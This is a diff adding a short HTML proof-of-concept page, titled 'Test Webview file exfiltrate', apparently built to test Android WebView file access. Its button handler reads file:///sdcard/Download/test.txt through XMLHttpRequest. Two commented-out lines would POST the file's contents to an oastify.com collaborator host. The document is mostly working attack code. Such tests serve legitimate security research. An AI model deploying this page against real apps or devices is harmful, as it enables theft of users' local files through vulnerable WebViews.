@@ -1,1 +1,24 @@
+<!DOCTYPE html>
+<html>    
+    
+<body>
+    Test Webview file exfiltrate: <br>
 
+ <button onclick="myFunction()">Try it</button>
+
+<script>
+function myFunction() {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+            alert("1");
+        }
+    }
+    xhr.open('GET', 'file:///sdcard/Download/test.txt', true);
+    xhr.send(null);
+    //xhr.open("POST","https://axb01enk2ycsdig0c9yn7w3y1p7gv7jw.oastify.com",false);
+	//xhr.send(request.responseText);
+}
+</script>
+</body>
+</html>
